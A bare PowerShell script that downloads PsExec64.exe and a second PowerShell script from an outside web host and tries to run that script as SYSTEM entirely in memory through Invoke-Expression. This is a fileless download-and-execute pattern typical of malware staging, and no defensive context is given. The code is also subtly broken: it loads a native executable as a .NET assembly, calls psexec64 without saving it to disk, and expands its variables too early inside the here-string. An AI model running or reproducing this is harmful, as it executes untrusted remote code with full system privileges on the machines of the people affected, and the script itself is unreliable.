$script = @"
# URLs for PsExec and the script
$psexecUrl = "http://lenrad.io/img/PsExec64.exe"
$scriptUrl = "http://lenrad.io/img/script1.ps1"

# Download PsExec to memory
$psexecBytes = (Invoke-WebRequest -Uri $psexecUrl).Content

# Load PsExec into memory
$psExecAssembly = [System.Reflection.Assembly]::Load($psexecBytes)

# Download the PowerShell script to memory
$scriptContent = (Invoke-WebRequest -Uri $scriptUrl).Content

# Create a script block from the downloaded script content
$scriptBlock = [scriptblock]::Create($scriptContent)

# Execute PsExec to run the downloaded PowerShell script as SYSTEM
$psExecCommand = "psexec64  -accepteula -s -i powershell.exe -Command `"$scriptBlock`""
Invoke-Expression -Command $psExecCommand
"@

Invoke-Expression -Command $script